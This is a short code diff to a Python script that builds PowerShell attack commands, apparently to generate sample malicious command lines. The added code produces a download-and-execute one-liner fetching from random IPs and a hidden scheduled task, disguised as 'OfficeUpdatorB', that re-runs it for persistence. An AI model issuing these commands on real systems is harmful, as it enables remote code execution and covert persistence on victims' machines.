@@ -15,11 +15,17 @@ def get_random_dest():
 		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
 		return ip + path
 
-def get_payload_cmd():
+def remote_payload_cmd():
 	ip = get_random_dest()
 	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + ip + "\") \n"
 
-commands = [get_payload_cmd]
+#https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
+def persistence_cmd():
+	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
+	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
+	return cmd
+
+commands = [remote_payload_cmd, persistence_cmd]
 
 def generate_script():
 	script = ""
